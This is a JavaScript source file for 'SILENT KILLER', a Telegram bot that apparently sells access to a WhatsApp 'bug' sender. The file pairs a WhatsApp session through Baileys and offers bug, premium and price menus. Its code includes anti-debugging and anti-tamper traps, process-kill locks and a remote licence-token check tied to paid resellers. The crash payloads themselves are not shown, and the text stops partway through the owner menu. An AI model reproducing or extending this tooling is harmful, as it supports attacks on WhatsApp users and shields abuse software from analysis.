const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const FormData = require("form-data");
const https = require("https");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  BufferJSON,
  DisconnectReason,
  proto,
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { TOKEN_BOT, OWNER_ID} = require("./config");
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}


//========={ URL RAW + PHOTO}========\\
const databaseUrl = "https://raw.githubusercontent.com/basesc/basesc/refs/heads/main/tokens.json";
const thumbnailUrl = "https://files.catbox.moe/x69184.jpg";
const zhatanixx = "https://files.catbox.moe/x69184.jpg";
//========={ END RAW PHOTO}===========\\


function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

function activateSecureMode() {
  secureMode = false;
}

function getHash(data) {
  return crypto.createHash("md5").update(data).digest("hex");
}

async function isAdmin(ctx) {
  try {
    const member = await ctx.telegram.getChatMember(
      ctx.chat.id,
      ctx.from.id
    );

    return ["administrator", "creator"].includes(member.status);

  } catch {
    return false;
  }
};

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.red(`
⬡═―――—⊱ ⎧ 𝗦𝗜𝗟𝗘𝗡𝗧 𝗞𝗜𝗟𝗟𝗘𝗥 ⎭ ⊰―――—═⬡
⌑ Developer : @zhatanixx
⌑ Information : @aboutzhatanixx
⌑ Name Script : SILENT KILLER 
⌑ Version : V11 Gen 10
⌑ Status: Bot Connect
⬡═―――――—⊱ ⎧ 𝗕 𝗢 𝗧 𝗖 𝗢 𝗡 𝗡 𝗘 𝗖 𝗧 ⎭ ⊰―――――—═⬡
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.yellow(`
⠀⠀⠀⣠⠂⢀⣠⡴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢤⣄⠀⠐⣄⠀⠀⠀
⠀⢀⣾⠃⢰⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⡆⠸⣧⠀⠀
⢀⣾⡇⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠁⠀⢹⣧⠀
⢸⣿⠀⠀⠀⢹⣷⣀⣤⣤⣀⣀⣠⣶⠂⠰⣦⡄⢀⣤⣤⣀⣀⣾⠇⠀⠀⠈⣿⡆
⣿⣿⠀⠀⠀⠀⠛⠛⢛⣛⣛⣿⣿⣿⣶⣾⣿⣿⣿⣛⣛⠛⠛⠛⠀⠀⠀⠀⣿⣷
⣿⣿⣀⣀⠀⠀⢀⣴⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⣀⣠⣿⣿
⠛⠻⠿⠿⣿⣿⠟⣫⣶⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣙⠿⣿⣿⠿⠿⠛⠋
⠀⠀⠀⠀⠀⣠⣾⠟⣯⣾⠟⣻⣿⣿⣿⣿⣿⣿⡟⠻⣿⣝⠿⣷⣌⠀⠀⠀⠀⠀
⠀⠀⢀⣤⡾⠛⠁⢸⣿⠇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⢹⣿⠀⠈⠻⣷⣄⡀⠀⠀
⢸⣿⡿⠋⠀⠀⠀⢸⣿⠀⠀⢿⣿⣿⣿⣿⣿⣿⡟⠀⢸⣿⠆⠀⠀⠈⠻⣿⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡀⠀⠘⣿⣿⣿⣿⣿⡿⠁⠀⢸⣿⠀⠀⠀⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡇⠀⠀⠈⢿⣿⣿⡿⠁⠀⠀⢸⣿⠀⠀⠀⠀⠀⣼⣿⠃
⠈⣿⣷⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠈⢻⠟⠁⠀⠀⠀⣼⣿⡇⠀⠀⠀⠀⣿⣿⠀
⠀⢿⣿⡄⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⢰⣿⡟⠀
⠀⠈⣿⣷⠀⠀⠀⢸⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠃⠀⠀⢀⣿⡿⠁⠀
⠀⠀⠈⠻⣧⡀⠀⠀⢻⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡟⠀⠀⢀⣾⠟⠁⠀⠀
⠀⠀⠀⠀⠀⠁⠀⠀⠈⢿⣿⡆⠀⠀⠀⠀⠀⠀⣸⣿⡟⠀⠀⠀⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡄⠀⠀⠀⠀⣰⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠆⠀⠀ ⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
» Information:
☇ Creator : @zhatanixx
☇ Name Script : Silent Killer  
☇ Version : 1.2.310
  
  Bypass detected, the code in zhatanixx will be messed up.
  `))
        activateSecureMode();
        hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.yellow(`
⠀⠀⠀⣠⠂⢀⣠⡴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢤⣄⠀⠐⣄⠀⠀⠀
⠀⢀⣾⠃⢰⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⡆⠸⣧⠀⠀
⢀⣾⡇⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠁⠀⢹⣧⠀
⢸⣿⠀⠀⠀⢹⣷⣀⣤⣤⣀⣀⣠⣶⠂⠰⣦⡄⢀⣤⣤⣀⣀⣾⠇⠀⠀⠈⣿⡆
⣿⣿⠀⠀⠀⠀⠛⠛⢛⣛⣛⣿⣿⣿⣶⣾⣿⣿⣿⣛⣛⠛⠛⠛⠀⠀⠀⠀⣿⣷
⣿⣿⣀⣀⠀⠀⢀⣴⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⣀⣠⣿⣿
⠛⠻⠿⠿⣿⣿⠟⣫⣶⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣙⠿⣿⣿⠿⠿⠛⠋
⠀⠀⠀⠀⠀⣠⣾⠟⣯⣾⠟⣻⣿⣿⣿⣿⣿⣿⡟⠻⣿⣝⠿⣷⣌⠀⠀⠀⠀⠀
⠀⠀⢀⣤⡾⠛⠁⢸⣿⠇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⢹⣿⠀⠈⠻⣷⣄⡀⠀⠀
⢸⣿⡿⠋⠀⠀⠀⢸⣿⠀⠀⢿⣿⣿⣿⣿⣿⣿⡟⠀⢸⣿⠆⠀⠀⠈⠻⣿⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡀⠀⠘⣿⣿⣿⣿⣿⡿⠁⠀⢸⣿⠀⠀⠀⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡇⠀⠀⠈⢿⣿⣿⡿⠁⠀⠀⢸⣿⠀⠀⠀⠀⠀⣼⣿⠃
⠈⣿⣷⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠈⢻⠟⠁⠀⠀⠀⣼⣿⡇⠀⠀⠀⠀⣿⣿⠀
⠀⢿⣿⡄⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⢰⣿⡟⠀
⠀⠈⣿⣷⠀⠀⠀⢸⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠃⠀⠀⢀⣿⡿⠁⠀
⠀⠀⠈⠻⣧⡀⠀⠀⢻⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡟⠀⠀⢀⣾⠟⠁⠀⠀
⠀⠀⠀⠀⠀⠁⠀⠀⠈⢿⣿⡆⠀⠀⠀⠀⠀⠀⣸⣿⡟⠀⠀⠀⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡄⠀⠀⠀⠀⣰⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠆⠀⠀ ⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
» Information:
☇ Creator : @zhatanixx
☇ Name Script : Silent Killer  
☇ Version : 1.2.310
  
  Bypass detected, the code in zhatanixx will be messed up.
  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      activateSecureMode();
      hardExit(1);
    }
  }, 2000);

  global.validateToken = async (databaseUrl, TOKEN_BOT) => {
  try {
    const res = await axios.get(databaseUrl, { timeout: 5000 });
    const tokens = (res.data && res.data.tokens) || [];

    if (!tokens.includes(TOKEN_BOT)) {
      console.log(chalk.bold.red(`⠀⠀⠀⠀⠀⠀⠀
» Information:
☇ Creator : @zhatanixx
☇ Name Script : Silent Killer  
☇ Version : 1.2.310
  
  Token tidak terdaftar, Mohon membeli akses kepada reseller yang tersedia
  `));

      try {
      } catch (e) {
      }

      activateSecureMode();
      hardExit(1);
    }
  } catch (err) {
    console.log(chalk.bold.red(`
⬡═―――—⊱ ⎧ 𝗦𝗜𝗟𝗘𝗡𝗧 𝗞𝗜𝗟𝗟𝗘𝗥 ⎭ ⊰―――—═⬡
⌑ Developer : @zhatanixx
⌑ Name Script : SILENT KILLER 
⌑ Version : V11 Gen 10
⌑ Status: Bot Connect
⬡═―⊱ ⎧ 𝗕 𝗢 𝗧 𝗖 𝗢 𝗡 𝗡 𝗘 𝗖 𝗧 ⎭ ⊰―—═⬡
  `));
    activateSecureMode();
    hardExit(1);
  }
};
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await axios.get(databaseUrl);
        const authorizedTokens = res.data.tokens;
        return authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, TOKEN_BOT);
})();

const bot = new Telegraf(TOKEN_BOT);
let tokenValidated = false; // volatile gate: require token each restart

let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.red(`
⬡═―――—⊱ ⎧ 𝗦𝗜𝗟𝗘𝗡𝗧 𝗞𝗜𝗟𝗟𝗘𝗥 ⎭ ⊰―――—═⬡
⌑ Developer : @zhatanixx
⌑ Information : @aboutzhatanixx
⌑ Name Script : SILENT KILLER 
⌑ Version : V11 Gen 10
⌑ Status: Bot Connect
⬡═―――――—⊱ ⎧ 𝗕 𝗢 𝗧 𝗖 𝗢 𝗡 𝗡 𝗘 𝗖 𝗧 ⎭ ⊰―――――—═⬡
`))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Apophis',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote>𝗣𝗔𝗜𝗥𝗜𝗡𝗚 ☇ 𝗖𝗢𝗡𝗡𝗘𝗖𝗧</blockquote>
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Status: Connected ✅`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
⬡═―――—⊱ ⎧ 𝗦 𝗘 𝗡 𝗗 𝗘 𝗥 ☇ 𝗖 𝗢 𝗡 𝗡 𝗘 𝗖 𝗧 ⎭ ⊰―――—═⬡
⌑ Name Script : SILENT KILLER 
⌑ Version : V11 Gen 10
⌑ Sender : Connect
  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};


// ========================== \\
const antiForwardFile = './Security/antiforward.json';
const antiAdminFile = './Security/antiadmin.json';
const antiMediaFile = './Security/antimedia.json';
const antiLinkFile = './Security/antilink.json';
const antiPromosiFile = './Security/antipromosi.json';
const antiPornoFile = './Security/antiporno.json';
// ==== [ SECURITY FUN ] =====\\

function loadAntiForward() {
  try {
    return JSON.parse(fs.readFileSync(antiForwardFile));
  } catch {
    return { enabled: false };
  }
}

function saveAntiForward(data) {
  fs.writeFileSync(antiForwardFile, JSON.stringify(data, null, 2));
}

function loadAntiAdmin() {
  try {
    return JSON.parse(fs.readFileSync(antiAdminFile));
  } catch {
    return { enabled: false };
  }
}

function saveAntiAdmin(data) {
  fs.writeFileSync(antiAdminFile, JSON.stringify(data, null, 2));
}

function loadAntiMedia() {
  try {
    return JSON.parse(fs.readFileSync(antiMediaFile));
  } catch {
    return { enabled: false, mode: "all" };
  }
}

function saveAntiMedia(data) {
  fs.writeFileSync(antiMediaFile, JSON.stringify(data, null, 2));
}

function loadAntiLink() {
  try {
    return JSON.parse(fs.readFileSync(antiLinkFile));
  } catch {
    return { enabled: false };
  }
}

function saveAntiLink(data) {
  fs.writeFileSync(antiLinkFile, JSON.stringify(data, null, 2));
}

function loadAntiPromosi() {
  try {
    return JSON.parse(fs.readFileSync(antiPromosiFile));
  } catch {
    return { enabled: false };
  }
}

function saveAntiPromosi(data) {
  fs.writeFileSync(antiPromosiFile, JSON.stringify(data, null, 2));
}

function loadAntiPorno() {
  try {
    return JSON.parse(fs.readFileSync(antiPornoFile));
  } catch {
    return { enabled: false };
  }
}

function saveAntiPorno(data) {
  fs.writeFileSync(antiPornoFile, JSON.stringify(data, null, 2));
}
/// ==============[ START MENU ]============///
bot.start(async (ctx) => {
    const runtimeStatus = formatRuntime();
    const user = ctx.from;

    const username = user.username ? "@" + user.username : "Tidak ada";
    const userId = user.id;
    const name = user.first_name;

    const statusWA = isWhatsAppConnected ? "Connected" : "Disconnected";
    const premium = isPremiumUser(userId) ? "Yes" : "No";
    
    const menuMessage = `
<blockquote>⬡═――⊱ ⎧ ♱ 𝑾𝒆𝒍𝒍𝒄𝒐𝒎𝒆 𝑪𝒕𝒐𝒔𝒍𝒆𝒙𝒕 𝑺𝒊𝒍𝒆𝒏𝒕 ♱ ⎭ ⊰―—═⬡</blockquote>
⸙ Developer : zhatanixx.t.me
⸙ Name Script : SILENT KILLER
⸙ Version : 1.2.310
⸙ Platfrom : telegraf 
<blockquote>⬡═――⊱ ⎧ 𖤝 𝑰𝒏𝒇𝒐𝒓𝒎𝒂𝒔𝒊 𝑩𝒐𝒕 𖤝 ⎭ ⊰―—═⬡</blockquote>
ヤ Username : ${username}
ヤ Name : ${ctx.from.first_name} 
ヤ Runtime : ${runtimeStatus} 
ヤ Status Sender : ${statusWA} 
ヤ Status Prem : ${premium}

<blockquote># sᴇʟᴇᴄᴛ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ᴛᴏ sʜᴏᴡ ᴍᴇɴᴜ</blockquote>
<blockquote>[created by zhatanixx ]</blockquote>`;

    const keyboard = [   
        [
            { text: "(⌭) ʜᴀʀɢᴀ ꜱᴄʀɪᴘᴛ", callback_data: "/harga", style: "danger" }
        ],
        [
            { text: "(⌯⌲) ʙᴜɢ'ꜱ ᴍᴇɴᴜ", callback_data: "/bug", style: "danger" },
            { text: "(※) ᴏᴡɴᴇʀ'ꜱ ᴍᴇɴᴜ", callback_data: "/controls", style: "danger" }
        ],
        [
            { text: "(☭) ꜱᴜᴘᴘᴏʀᴛ ᴍᴇɴᴜ", callback_data: "/tqto", style: "primary" },
            { text: "(๛) ᴛᴏᴏʟ'ꜱ ᴠ1", callback_data: "/toolsv1", style: "primary" }
        ],
        [
            { text: "(ᥫ᭡) ᴛᴏᴏʟ'ꜱ ᴠ2", callback_data: "/toolsv2", style: "danger" }
        ],
        [
            { text: "(𔒝) ᴛᴏᴏʟ'ꜱ ᴠ3", callback_data: "/toolsv3", style: "success" },
            { text: "(⛃) ᴅᴏɴᴀsɪ ᴍᴇᴍʙᴇʀ", callback_data: "/donasi", style: "success" }
        ], 
        [
            { text: "(𐚁) ɢʀᴏᴜᴘ ᴍᴇɴᴜ", callback_data: "/gbmenu", style: "danger" }
        ], 
        [
            { text: "(⌘) ɢᴀᴍᴇ ᴍᴇɴᴜ", callback_data: "/game", style: "primary" },
            { text: "(⌗) ꜱᴄᴜʀɪᴛʏ ᴍᴇɴᴜ", callback_data: "/security", style: "primary" }
        ],
        [
            { text: "(⸙) ɪɴꜰᴏʀᴍᴀᴛɪᴏɴ", url: "https://t.me/aboutzhatanixx", style: "success" },
            { text: "(♛) ᴏᴡɴᴇʀ'ꜱ ꜱᴄʀɪᴘᴛ", url: "https://t.me/zhatanixx", style: "success" }
        ],
        [
           { text: "(⌬) ʀᴏᴀᴍ ᴄʜᴀᴛ", url: "https://t.me/areangobrol", style: "success" }
        ]
    ];

    return ctx.replyWithPhoto(thumbnailUrl, {
        caption: menuMessage,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
});
// ====[ MAIN MENU ]====\\
bot.action('/mainmenu', async (ctx) => {
    const runtimeStatus = formatRuntime();
    const user = ctx.from;

    const username = user.username ? "@" + user.username : "Tidak ada";
    const userId = user.id;
    const name = user.first_name;

    const statusWA = isWhatsAppConnected ? "Connected" : "Disconnected";
    const premium = isPremiumUser(userId) ? "Yes" : "No";
    
    const menuMessage = `
<blockquote>⬡═――⊱ ⎧ ♱ 𝑾𝒆𝒍𝒍𝒄𝒐𝒎𝒆 𝑪𝒕𝒐𝒔𝒍𝒆𝒙𝒕 𝑺𝒊𝒍𝒆𝒏𝒕 ♱ ⎭ ⊰―—═⬡</blockquote>
⸙ Developer : zhatanixx.t.me
⸙ Name Script : SILENT KILLER
⸙ Version : 1.2.310
⸙ Platfrom : telegraf 
<blockquote>⬡═――⊱ ⎧ 𖤝 𝑰𝒏𝒇𝒐𝒓𝒎𝒂𝒔𝒊 𝑩𝒐𝒕 𖤝 ⎭ ⊰―—═⬡</blockquote>
ヤ Username : ${username}
ヤ Name : ${ctx.from.first_name} 
ヤ Runtime : ${runtimeStatus} 
ヤ Status Sender : ${statusWA} 
ヤ Status Prem : ${premium}

<blockquote># sᴇʟᴇᴄᴛ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ᴛᴏ sʜᴏᴡ ᴍᴇɴᴜ</blockquote>
<blockquote>[ created by zhatanixx ]</blockquote>`;

    const keyboard = [   
        [ 
            { text: "(⌭) ʜᴀʀɢᴀ ꜱᴄʀɪᴘᴛ", callback_data: "/harga", style: "danger" }
        ],
        [
            { text: "(⌯⌲) ʙᴜɢ'ꜱ ᴍᴇɴᴜ", callback_data: "/bug", style: "danger" },
            { text: "(※) ᴏᴡɴᴇʀ'ꜱ ᴍᴇɴᴜ", callback_data: "/controls", style: "danger" }
        ],
        [
            { text: "(☭) ꜱᴜᴘᴘᴏʀᴛ ᴍᴇɴᴜ", callback_data: "/tqto", style: "primary" },
            { text: "(๛) ᴛᴏᴏʟ'ꜱ ᴠ1", callback_data: "/toolsv1", style: "primary" }
        ],
        [
            { text: "(ᥫ᭡) ᴛᴏᴏʟ'ꜱ ᴠ2", callback_data: "/toolsv2", style: "danger" }
        ],
        [
            { text: "(𔒝) ᴛᴏᴏʟ'ꜱ ᴠ3", callback_data: "/toolsv3", style: "success" },
            { text: "(⛃) ᴅᴏɴᴀsɪ ᴍᴇᴍʙᴇʀ", callback_data: "/donasi", style: "success" }
        ], 
        [
            { text: "(𐚁) ɢʀᴏᴜᴘ ᴍᴇɴᴜ", callback_data: "/gbmenu", style: "danger" }
        ],
        [
            { text: "(⌘) ɢᴀᴍᴇ ᴍᴇɴᴜ", callback_data: "/game", style: "primary" },
            { text: "(⌗) ꜱᴄᴜʀɪᴛʏ ᴍᴇɴᴜ", callback_data: "/security", style: "primary" }
        ],
        [
            { text: "(⸙) ɪɴꜰᴏʀᴍᴀᴛɪᴏɴ", url: "https://t.me/aboutzhatanixx", style: "success" },
            { text: "(♛) ᴏᴡɴᴇʀ'ꜱ ꜱᴄʀɪᴘᴛ", url: "https://t.me/zhatanixx", style: "success" }
        ],
        [
           { text: "(⌬) ʀᴏᴀᴍ ᴄʜᴀᴛ", url: "https://t.me/areangobrol", style: "success" }
        ]
    ];

    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: thumbnailUrl,
            caption: menuMessage,
            parse_mode: "HTML",
        }, {
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});


// ==== [ OWNER'S MENU ] ====\\
bot.action('/controls', async (ctx) => {
    const controlsMenu = `
<blockquote><b>─( 🕸 ) || 𝗧𝗛𝗘 𝗦𝗜𝗟𝗘𝗡𝗧 𝗞𝗜𝗟𝗟𝗘𝗥</b></blockquote>
─ ᴛᴇʀɪᴍᴀᴋᴀꜱɪʜ ᴛᴇʟᴀʜ ꜱᴇᴛɪᴀ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ꜱɪʟᴇɴᴛ ᴋɪʟʟᴇʀ.
ꜱᴇʟᴀʟᴜ ɴᴀɴᴛɪᴋᴀɴ, ɪɴғᴏ, ᴘʀᴏᴊᴇᴄᴛ ᴛᴇʀʙᴀʀᴜ ᴅᴀʀɪ ᴋᴀᴍɪ ⎙
─────────────────────
「 𝗧𝗛𝗘 𝗦𝗜𝗟𝗘𝗡𝗧 𝗞𝗜𝗟𝗟𝗘𝗥 」
⸙ Developer : zhatanixx.t.me
⸙ Version : 1.2.310
⸙ Language : Javascript 
⸙ Platfrom : telegraf 
╘═———————---———————═⬡
<blockquote>「 𝑺𝒑𝒆𝒄𝒊𝒂𝒍 𝑨𝒄𝒄𝒆𝒔 𝑴𝒆𝒏𝒖 」</blockquote>
ᯓ /addgc - Add Premium Group
ᯓ /delgc - Delete Premium Group
